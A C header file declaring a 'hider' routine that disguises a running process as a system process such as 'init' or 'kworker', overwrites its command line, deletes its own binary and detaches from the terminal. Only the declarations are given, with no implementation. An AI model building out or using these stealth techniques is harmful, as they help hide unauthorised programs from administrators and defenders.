#ifndef HIDER_H
#define HIDER_H

#ifdef __cplusplus
extern "C" {
#endif

/**
 * Change process/thread name, overwrite cmdline, unlink binary,
 * and detach from terminal. Root recommended for maximum obfuscation.
 * 
 * @param new_name Name to mimic (e.g., "init" or "kworker")
 * @return 0 on success, -1 if any step fails
 */
int run_hider(const char *new_name);

/**
 * Change the thread/process name using prctl
 * @param new_name Name to set
 * @return 0 on success, -1 on error
 */
int set_comm(const char *new_name);

/**
 * Overwrite /proc/self/cmdline with new_name
 * @param new_name Name to write
 * @return 0 on success, -1 on error
 */
int overwrite_cmdline(const char *new_name);

/**
 * Unlink the running binary from disk
 * @return 0 on success, -1 on error
 */
int unlink_self();

/**
 * Detach from controlling terminal and redirect stdio to /dev/null
 */
void detach_terminal();

#ifdef __cplusplus
}
#endif

#endif // HIDER_H
